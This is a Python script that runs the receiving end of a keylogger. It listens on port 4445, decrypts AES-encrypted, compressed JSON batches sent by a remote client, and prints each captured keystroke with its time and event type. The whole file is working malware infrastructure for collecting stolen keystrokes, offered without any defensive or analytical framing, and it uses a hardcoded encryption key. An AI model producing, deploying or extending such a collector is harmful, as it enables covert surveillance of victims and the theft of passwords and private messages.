import os
import socket
import zlib
import json
from cryptography.hazmat.primitives.ciphers import Cipher, algorithms, modes
from cryptography.hazmat.backends import default_backend

ENCRYPTION_KEY = b'This-is-a-32-byte-AES-key-1234!!'  # 32 characters = 32 bytes
PORT = 4445


def decrypt_data(encrypted_data):
    """Proper decryption with key validation"""
    from cryptography.hazmat.primitives import padding

    # Validate key first
    if len(ENCRYPTION_KEY) not in {16, 24, 32}:
        raise ValueError(
            f"Invalid key length {len(ENCRYPTION_KEY)}. "
            "Key must be 16, 24, or 32 bytes long."
        )

    # Extract IV and decrypt
    iv = encrypted_data[:16]
    ciphertext = encrypted_data[16:]

    cipher = Cipher(
        algorithms.AES(ENCRYPTION_KEY),
        modes.CBC(iv),
        backend=default_backend()
    )
    decryptor = cipher.decryptor()
    padded_plaintext = decryptor.update(ciphertext) + decryptor.finalize()

    # Remove padding
    unpadder = padding.PKCS7(128).unpadder()
    return unpadder.update(padded_plaintext) + unpadder.finalize()


def process_payload(data):
    """Handle decompression and parsing"""
    decompressed = zlib.decompress(data)
    return json.loads(decompressed.decode())


def start_receiver():
    with socket.socket(socket.AF_INET, socket.SOCK_STREAM) as s:
        s.bind(('0.0.0.0', PORT))
        s.listen()
        print(f"[*] Listening on port {PORT}")

        while True:
            conn, addr = s.accept()
            print(f"[+] Connection from {addr}")

            try:
                while True:
                    # Read message length
                    header = conn.recv(4)
                    if not header:
                        break
                    length = int.from_bytes(header, 'big')

                    # Read encrypted payload
                    encrypted = b''
                    while len(encrypted) < length:
                        chunk = conn.recv(length - len(encrypted))
                        if not chunk:
                            break
                        encrypted += chunk

                    # Decrypt and process
                    decrypted = decrypt_data(encrypted)
                    keystrokes = process_payload(decrypted)

                    # Display results
                    for stroke in keystrokes:
                        print(f"[{stroke['time']}] {stroke['key']} ({stroke['event']})")

            except Exception as e:
                print(f"Error: {e}")
            finally:
                conn.close()


if __name__ == "__main__":
    start_receiver()